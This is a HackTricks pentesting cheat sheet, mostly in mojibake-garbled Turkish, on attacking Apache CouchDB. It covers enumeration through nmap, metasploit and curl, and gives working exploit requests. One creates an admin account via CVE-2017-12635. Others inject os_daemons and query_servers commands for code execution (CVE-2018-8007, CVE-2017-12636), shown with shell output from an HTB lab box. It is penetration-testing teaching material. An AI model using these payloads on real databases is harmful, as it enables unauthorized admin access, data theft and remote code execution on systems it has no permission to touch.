# 5984,6984 - CouchDB Pentesting

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## **Temel Bilgiler**

**CouchDB**, her bir **belge** iÃ§inde bir **anahtar-deÄŸer haritasÄ±** yapÄ±sÄ± kullanarak verileri dÃ¼zenleyen Ã§ok yÃ¶nlÃ¼ ve gÃ¼Ã§lÃ¼ bir **belge odaklÄ± veritabanÄ±dÄ±r**. Belge iÃ§indeki alanlar **anahtar/deÄŸer Ã§iftleri, listeler veya haritalar** olarak temsil edilebilir, bu da veri depolama ve alÄ±mÄ±nda esneklik saÄŸlar.

CouchDB'de depolanan her **belge**, belge dÃ¼zeyinde benzersiz bir tanÄ±mlayÄ±cÄ± (`_id`) atanÄ±r. AyrÄ±ca, veritabanÄ±na yapÄ±lan her deÄŸiÅŸiklik kaydedildiÄŸinde bir **revizyon numarasÄ±** (`_rev`) atanÄ±r. Bu revizyon numarasÄ±, deÄŸiÅŸikliklerin etkin bir ÅŸekilde **izlenmesine ve yÃ¶netilmesine** olanak tanÄ±r, veritabanÄ± iÃ§indeki verilerin kolay alÄ±mÄ±nÄ± ve senkronizasyonunu saÄŸlar.

**VarsayÄ±lan port:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Otomatik NumaralandÄ±rma**

Automatic enumeration is the process of gathering information about a target system or network without manual intervention. It involves using tools and scripts to automatically scan and enumerate various aspects of the target, such as open ports, running services, and available databases.

Otomatik numaralandÄ±rma, manuel mÃ¼dahale olmadan hedef sistem veya aÄŸ hakkÄ±nda bilgi toplama sÃ¼recidir. Bu, aÃ§Ä±k portlar, Ã§alÄ±ÅŸan servisler ve mevcut veritabanlarÄ± gibi hedefin Ã§eÅŸitli yÃ¶nlerini otomatik olarak taramak ve numaralandÄ±rmak iÃ§in araÃ§lar ve komut dosyalarÄ± kullanmayÄ± iÃ§erir.

### **CouchDB Enumeration**

CouchDB is a NoSQL database that stores data in JSON format. During a penetration test, it is important to enumerate CouchDB instances to identify potential vulnerabilities and misconfigurations.

CouchDB, verileri JSON formatÄ±nda depolayan bir NoSQL veritabanÄ±dÄ±r. Bir penetrasyon testi sÄ±rasÄ±nda, potansiyel zayÄ±flÄ±klarÄ± ve yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± belirlemek iÃ§in CouchDB Ã¶rneklerini numaralandÄ±rmak Ã¶nemlidir.

#### **1. Nmap CouchDB Script**

Nmap is a powerful network scanning tool that can be used to enumerate CouchDB instances. The `couchdb` NSE script can be used to identify CouchDB instances and gather information about them.

Nmap, CouchDB Ã¶rneklerini numaralandÄ±rmak iÃ§in kullanÄ±labilecek gÃ¼Ã§lÃ¼ bir aÄŸ tarama aracÄ±dÄ±r. `couchdb` NSE komut dosyasÄ±, CouchDB Ã¶rneklerini tanÄ±mlamak ve hakkÄ±nda bilgi toplamak iÃ§in kullanÄ±labilir.

```bash
nmap -p 5984 --script couchdb <target>
```

#### **2. Manual Enumeration**

In addition to using automated tools, manual enumeration techniques can also be used to gather information about CouchDB instances. Some techniques include:

- **Web Interface**: Accessing the CouchDB web interface and exploring the available databases and documents.
- **HTTP Requests**: Sending HTTP requests to the CouchDB API to retrieve information about the databases, documents, and server configuration.
- **Authentication**: Attempting to authenticate to the CouchDB instance using default or weak credentials.

#### **3. Exploitation**

Once vulnerabilities or misconfigurations are identified during the enumeration phase, they can be further exploited to gain unauthorized access or perform other malicious activities. Some common exploitation techniques for CouchDB include:

- **Remote Code Execution**: Exploiting vulnerabilities in CouchDB to execute arbitrary code on the server.
- **Privilege Escalation**: Leveraging misconfigurations or vulnerabilities to escalate privileges and gain administrative access to the CouchDB instance.
- **Data Exfiltration**: Extracting sensitive data from the CouchDB instance, such as user credentials or confidential documents.

It is important to note that exploitation should only be performed with proper authorization and in a controlled environment. Unauthorized exploitation of systems or networks is illegal and unethical.
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
#### Banner

CouchDB, bir NoSQL veritabanÄ±dÄ±r. Bir HTTP sunucusu olarak Ã§alÄ±ÅŸÄ±r ve istemcilerle JSON belgeleri Ã¼zerinden iletiÅŸim kurar. CouchDB'nin banner'Ä±, sunucunun sÃ¼rÃ¼m numarasÄ±nÄ± ve diÄŸer bilgileri iÃ§erir. Banner bilgileri, hedef sistem hakkÄ±nda Ã¶nemli ipuÃ§larÄ± saÄŸlayabilir.

Banner bilgisini elde etmek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
curl -X GET http://<hedef_IP>:<hedef_port>/
```

Bu komutu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda, CouchDB sunucusunun banner bilgilerini alacaksÄ±nÄ±z. Bu bilgiler, hedef sistem hakkÄ±nda daha fazla bilgi edinmenize yardÄ±mcÄ± olabilir.
```
curl http://IP:5984/
```
Bu, kurulu CouchDB Ã¶rneÄŸine bir GET isteÄŸi gÃ¶nderir. YanÄ±t aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Couchdb'nin kÃ¶kÃ¼ne eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda, `401 Unauthorized` hatasÄ± alÄ±rsÄ±nÄ±z ve ÅŸÃ¶yle bir mesaj gÃ¶rÃ¼rsÃ¼nÃ¼z: `{"error":"unauthorized","reason":"Authentication required."}` Bu durumda banner veya diÄŸer herhangi bir uÃ§ noktaya eriÅŸemezsiniz.
{% endhint %}

### Bilgi Sorgulama

AÅŸaÄŸÄ±daki uÃ§ noktalara **GET** isteÄŸi ile eriÅŸebilir ve ilginÃ§ bilgiler Ã§Ä±karabilirsiniz. Couchdb belgelerinde [**daha fazla uÃ§ nokta ve daha detaylÄ± aÃ§Ä±klamalarÄ± bulabilirsiniz**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Ã‡alÄ±ÅŸan gÃ¶revlerin listesi, gÃ¶rev tÃ¼rÃ¼, adÄ±, durumu ve iÅŸlem kimliÄŸi dahil.
* **`/_all_dbs`** CouchDB Ã¶rneÄŸindeki tÃ¼m veritabanlarÄ±nÄ±n bir listesini dÃ¶ndÃ¼rÃ¼r.
* **`/_cluster_setup`** DÃ¼ÄŸÃ¼mÃ¼n veya kÃ¼menin durumunu, kÃ¼me kurulum sihirbazÄ±na gÃ¶re dÃ¶ndÃ¼rÃ¼r.
* **`/_db_updates`** CouchDB Ã¶rneÄŸindeki tÃ¼m veritabanÄ± etkinliklerinin bir listesini dÃ¶ndÃ¼rÃ¼r. Bu uÃ§ noktayÄ± kullanmak iÃ§in `_global_changes` veritabanÄ±nÄ±n var olmasÄ± gerekmektedir.
* **`/_membership`** KÃ¼menin bir parÃ§asÄ± olan dÃ¼ÄŸÃ¼mleri `cluster_nodes` olarak gÃ¶rÃ¼ntÃ¼ler. `all_nodes` alanÄ±, bu dÃ¼ÄŸÃ¼mÃ¼n bildiÄŸi tÃ¼m dÃ¼ÄŸÃ¼mleri, kÃ¼menin bir parÃ§asÄ± olanlarÄ± da iÃ§eren ÅŸekilde gÃ¶rÃ¼ntÃ¼ler.
* **`/_scheduler/jobs`** Ã‡oÄŸaltma iÅŸlerinin listesi. Her iÅŸ aÃ§Ä±klamasÄ± kaynak ve hedef bilgilerini, Ã§oÄŸaltma kimliÄŸini, son olay geÃ§miÅŸini ve diÄŸer birkaÃ§ ÅŸeyi iÃ§erir.
* **`/_scheduler/docs`** Ã‡oÄŸaltma belge durumlarÄ±nÄ±n listesi. Tamamlanan ve baÅŸarÄ±sÄ±z durumlar dahil olmak Ã¼zere tÃ¼m belgeler hakkÄ±nda bilgi iÃ§erir. Her belge iÃ§in belge kimliÄŸi, veritabanÄ±, Ã§oÄŸaltma kimliÄŸi, kaynak ve hedef ile diÄŸer bilgileri dÃ¶ndÃ¼rÃ¼r.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** `/_node/{node-name}` uÃ§ noktasÄ±, isteÄŸi iÅŸleyen sunucunun Erlang dÃ¼ÄŸÃ¼m adÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±labilir. Bu bilgiyi almak iÃ§in `/_node/_local`'e eriÅŸirken en faydalÄ±dÄ±r.
* **`/_node/{node-name}/_stats`** `_stats` kaynaÄŸÄ±, Ã§alÄ±ÅŸan sunucunun istatistiklerini iÃ§eren bir JSON nesnesi dÃ¶ndÃ¼rÃ¼r. Metin dizesi `_local`, yerel dÃ¼ÄŸÃ¼m adÄ± iÃ§in bir takma ad olarak hizmet eder, bu nedenle tÃ¼m istatistikler URL'leri iÃ§in `{node-name}` yerine `_local` kullanÄ±labilir, yerel dÃ¼ÄŸÃ¼mÃ¼n istatistikleriyle etkileÅŸimde bulunmak iÃ§in.
* **`/_node/{node-name}/_system`** \_system kaynaÄŸÄ±, Ã§alÄ±ÅŸan sunucunun Ã§eÅŸitli sistem dÃ¼zeyi istatistiklerini iÃ§eren bir JSON nesnesi dÃ¶ndÃ¼rÃ¼r\_.\_ GeÃ§erli dÃ¼ÄŸem bilgisini almak iÃ§in {node-name} olarak \_\_`_local` kullanabilirsiniz.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Sunucunun Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±, Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve isteklere yanÄ±t vermeye hazÄ±r olduÄŸunu doÄŸrular. [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) `true` veya `nolb` ise, uÃ§ nokta 404 yanÄ±tÄ± dÃ¶ndÃ¼rÃ¼r.
* **`/_uuids`** CouchDB Ã¶rneÄŸinden bir veya daha fazla Evrensel Benzersiz Kimlik (UUID) isteÄŸi yapar.
* **`/_reshard`** KÃ¼medeki tamamlanan, baÅŸarÄ±sÄ±z, Ã§alÄ±ÅŸan, durdurulan ve toplam iÅŸ sayÄ±sÄ±nÄ± ve yeniden paylaÅŸÄ±m durumunu dÃ¶ndÃ¼rÃ¼r.

Daha fazla ilginÃ§ bilgi burada aÃ§Ä±klandÄ±ÄŸÄ± gibi Ã§Ä±karÄ±labilir: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **VeritabanÄ± Listesi**
```
curl -X GET http://IP:5984/_all_dbs
```
EÄŸer bu istek **401 yetkisiz** ÅŸeklinde yanÄ±t verirse, veritabanÄ±na eriÅŸmek iÃ§in **geÃ§erli kimlik bilgilerine** ihtiyacÄ±nÄ±z vardÄ±r:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
GeÃ§erli Kimlik Bilgilerini bulmak iÃ§in **hizmeti** [**brute force**](../generic-methodologies-and-resources/brute-force.md#couchdb) ile deneyebilirsiniz.

Bu, yeterli ayrÄ±calÄ±klara sahip olduÄŸunuzda bir couchdb **yanÄ±tÄ±nÄ±n** bir **Ã¶rneÄŸidir** (Sadece bir veritabanÄ± listesidir):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### VeritabanÄ± Bilgisi

VeritabanÄ± adÄ±na eriÅŸerek bazÄ± veritabanÄ± bilgilerini (dosya sayÄ±sÄ± ve boyutlarÄ± gibi) elde edebilirsiniz:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Belge Listesi**

Bir veritabanÄ±ndaki her giriÅŸi listele
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Belgeyi Oku**

Bir veritabanÄ±ndaki belgenin iÃ§eriÄŸini okuyun:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Yetki YÃ¼kseltme [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Erlang ve JavaScript JSON ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ± arasÄ±ndaki farklardan dolayÄ± aÅŸaÄŸÄ±daki istekle `hacktricks:hacktricks` kimlik bilgilerine sahip bir yÃ¶netici kullanÄ±cÄ± **oluÅŸturabilirsiniz**:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Bu zafiyet hakkÄ±nda daha fazla bilgi burada**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

### **Erlang Ã‡erez GÃ¼venliÄŸi Genel BakÄ±ÅŸÄ±**

Ã–rnek [buradan](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

CouchDB belgelerinde, Ã¶zellikle kÃ¼me kurulumuyla ilgili bÃ¶lÃ¼mde ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), CouchDB'nin kÃ¼me modunda kullanÄ±lan baÄŸlantÄ± noktalarÄ± tartÄ±ÅŸÄ±lmaktadÄ±r. Standalone modunda olduÄŸu gibi, port `5984` kullanÄ±ldÄ±ÄŸÄ± belirtilmektedir. Ek olarak, port `5986` dÃ¼ÄŸme yerel API'larÄ± iÃ§indir ve Ã¶nemli olarak, Erlang, Erlang kÃ¼mesi iÃ§inde dÃ¼ÄŸme iletiÅŸimini kolaylaÅŸtÄ±ran Erlang Port HaritalayÄ±cÄ± Hizmeti (EPMD) iÃ§in TCP port `4369` gerektirir. Bu yapÄ±, her dÃ¼ÄŸÃ¼mÃ¼n diÄŸer her dÃ¼ÄŸÃ¼mle baÄŸlantÄ±lÄ± olduÄŸu bir aÄŸ oluÅŸturur.

Port `4369` ile ilgili Ã¶nemli bir gÃ¼venlik uyarÄ±sÄ± vurgulanmaktadÄ±r. EÄŸer bu port Ä°nternet Ã¼zerinden veya gÃ¼venilmeyen bir aÄŸ Ã¼zerinden eriÅŸilebilir hale getirilirse, sistem gÃ¼venliÄŸi benzersiz bir tanÄ±mlayÄ±cÄ± olan "Ã§erez"e aÄŸÄ±r ÅŸekilde baÄŸÄ±mlÄ± hale gelir. Bu Ã§erez bir gÃ¼venlik Ã¶nlemi olarak iÅŸlev gÃ¶rÃ¼r. Ã–rneÄŸin, bir iÅŸlem listesinde "monster" adÄ±nda bir Ã§erez gÃ¶zlemlenebilir ve bu Ã§erez, sistem gÃ¼venlik Ã§erÃ§evesindeki iÅŸlevsel rolÃ¼nÃ¼ gÃ¶sterir.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Bu "cookie"nin Erlang sistemleri baÄŸlamÄ±nda Uzaktan Kod YÃ¼rÃ¼tme (RCE) iÃ§in nasÄ±l istismar edilebileceÄŸini anlamak isteyenler iÃ§in, ilgili bir bÃ¶lÃ¼m daha fazla okuma iÃ§in mevcuttur. Bu bÃ¶lÃ¼mde, Erlang Ã§erezlerini yetkisiz ÅŸekilde kullanarak sistemler Ã¼zerinde kontrol elde etmek iÃ§in metodolojiler ayrÄ±ntÄ±lÄ± olarak aÃ§Ä±klanmaktadÄ±r. **[Erlang Ã§erezlerini RCE iÃ§in kÃ¶tÃ¼ye kullanma konusundaki ayrÄ±ntÄ±lÄ± kÄ±lavuzu buradan keÅŸfedebilirsiniz](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **CVE-2018-8007'nin local.ini DosyasÄ±nÄ±n DeÄŸiÅŸtirilmesiyle SÃ¶mÃ¼rÃ¼lmesi**

Ã–rnek [buradan](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Apache CouchDB'yi etkileyen, yakÄ±n zamanda aÃ§Ä±klanan CVE-2018-8007 adlÄ± bir zafiyet incelendi ve sÃ¶mÃ¼rÃ¼nÃ¼n `local.ini` dosyasÄ±na yazma izinleri gerektirdiÄŸi ortaya Ã§Ä±ktÄ±. Ä°lk hedef sistem iÃ§in doÄŸrudan uygulanamamasÄ±na raÄŸmen, keÅŸif amaÃ§larÄ±yla `local.ini` dosyasÄ±na yazma eriÅŸimi saÄŸlamak iÃ§in deÄŸiÅŸiklikler yapÄ±ldÄ±. AÅŸaÄŸÄ±da, sÃ¼reci gÃ¶steren ayrÄ±ntÄ±lÄ± adÄ±mlar ve kod Ã¶rnekleri sunulmaktadÄ±r.

Ä°lk olarak, Ã§evre, `local.ini` dosyasÄ±nÄ±n yazÄ±labilir olduÄŸundan emin olunarak hazÄ±rlanÄ±r ve izinler listelenerek doÄŸrulanÄ±r:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Zafiyeti sÃ¶mÃ¼rmek iÃ§in, `local.ini` iÃ§indeki `cors/origins` yapÄ±landÄ±rmasÄ±na hedeflenen bir curl komutu Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu, `[os_daemons]` bÃ¶lÃ¼mÃ¼ altÄ±nda yeni bir kÃ¶ken enjekte eder ve keyfi kodu Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§lar:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Sonraki doÄŸrulama, deÄŸiÅŸiklikleri vurgulamak iÃ§in `local.ini` iÃ§ine enjekte edilen yapÄ±landÄ±rmayÄ± yedekle karÅŸÄ±laÅŸtÄ±rÄ±r:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
BaÅŸlangÄ±Ã§ta, beklenen dosya (`/tmp/0xdf`) mevcut deÄŸil, bu da enjekte edilen komutun henÃ¼z Ã§alÄ±ÅŸtÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶stermektedir. Daha fazla araÅŸtÄ±rma, CouchDB ile ilgili iÅŸlemlerin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ortaya koyar, bunlardan biri enjekte edilen komutu potansiyel olarak Ã§alÄ±ÅŸtÄ±rabilir:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Belirlenen CouchDB iÅŸlemini sonlandÄ±rarak ve sistemin otomatik olarak yeniden baÅŸlatÄ±lmasÄ±na izin vererek, enjekte edilen komutun yÃ¼rÃ¼tÃ¼lmesi tetiklenir ve Ã¶nceden eksik olan dosyanÄ±n varlÄ±ÄŸÄ±yla doÄŸrulanÄ±r:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Bu keÅŸif, Ã¶zellikle `local.ini` dosyasÄ±na yazma eriÅŸimi gerekliliÄŸi gibi belirli koÅŸullar altÄ±nda CVE-2018-8007 saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilebilirliÄŸini doÄŸrulamaktadÄ±r. SaÄŸlanan kod Ã¶rnekleri ve prosedÃ¼r adÄ±mlarÄ±, kontrol edilen bir ortamda saldÄ±rÄ±nÄ±n tekrarlanmasÄ± iÃ§in net bir rehber sunmaktadÄ±r.

CVE-2018-8007 hakkÄ±nda daha fazla ayrÄ±ntÄ± iÃ§in mdsec tarafÄ±ndan yayÄ±nlanan bildiriye baÅŸvurun: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **local.ini Ãœzerinde Yazma Ä°zinleriyle CVE-2017-12636 KeÅŸfi**

Ã–rnek [buradan](https://0xdf.gitlab.io/2018/09/15/htb-canape.html) alÄ±nmÄ±ÅŸtÄ±r.

CVE-2017-12636 olarak bilinen bir zafiyet incelendi, bu zafiyet aracÄ±lÄ±ÄŸÄ±yla CouchDB iÅŸlemi Ã¼zerinden kod yÃ¼rÃ¼tme saÄŸlanmaktadÄ±r, ancak belirli yapÄ±landÄ±rmalarÄ±n saldÄ±rÄ±yÄ± engelleyebileceÄŸi durumlar mevcuttur. Ä°nternette birÃ§ok KanÄ±t-of-Kavram (POC) referansÄ± bulunmasÄ±na raÄŸmen, genellikle hedeflenen 1.x sÃ¼rÃ¼mÃ¼nden farklÄ± olarak, zafiyetin CouchDB sÃ¼rÃ¼m 2'de sÃ¶mÃ¼rÃ¼lmesi iÃ§in ayarlamalar gerekmektedir. Ä°lk adÄ±mlar, CouchDB sÃ¼rÃ¼mÃ¼nÃ¼n doÄŸrulanmasÄ± ve beklenen sorgu sunucularÄ± yolunun olmadÄ±ÄŸÄ±nÄ±n onaylanmasÄ±yla ilgilidir:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
CouchDB sÃ¼rÃ¼m 2.0'Ä± desteklemek iÃ§in yeni bir yol kullanÄ±lÄ±r:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Yeni bir sorgu sunucusu eklemek ve Ã§aÄŸÄ±rmak iÃ§in yapÄ±lan giriÅŸimler, aÅŸaÄŸÄ±daki Ã§Ä±ktÄ±da belirtilen izinle ilgili hatalarla karÅŸÄ±laÅŸtÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Daha fazla araÅŸtÄ±rma, yazÄ±labilir olmayan `local.ini` dosyasÄ±nda izin sorunlarÄ± olduÄŸunu ortaya Ã§Ä±kardÄ±. KÃ¶k veya homer eriÅŸimiyle dosya izinlerini deÄŸiÅŸtirerek ilerlemek mÃ¼mkÃ¼n hale geldi:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Sonraki denemelerde sorgu sunucusunu eklemek baÅŸarÄ±lÄ± oldu, bunu yanÄ±tta hata mesajÄ± olmamasÄ±yla kanÄ±tlandÄ±. `local.ini` dosyasÄ±nÄ±n baÅŸarÄ±lÄ± bir ÅŸekilde deÄŸiÅŸtirildiÄŸi, dosya karÅŸÄ±laÅŸtÄ±rmasÄ±yla doÄŸrulandÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
SÃ¼reÃ§, bir veritabanÄ± ve bir belge oluÅŸturulmasÄ±yla devam etti, ardÄ±ndan yeni eklenen sorgu sunucusuna eÅŸleme yapan Ã¶zel bir gÃ¶rÃ¼nÃ¼m aracÄ±lÄ±ÄŸÄ±yla kodun yÃ¼rÃ¼tÃ¼lme giriÅŸimi yapÄ±ldÄ±:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
Belirli koÅŸullar altÄ±nda CVE-2017-12636'nÄ±n istismar edilmesi hakkÄ±nda daha fazla bilgi saÄŸlayan bir **[Ã¶zet](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)**, alternatif bir yÃ¼k saÄŸlar. Bu zafiyetin istismar edilmesi iÃ§in **yararlÄ± kaynaklar** ÅŸunlarÄ± iÃ§erir:

- [POC istismar kodu](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Exploit Database giriÅŸi](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Referanslar

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
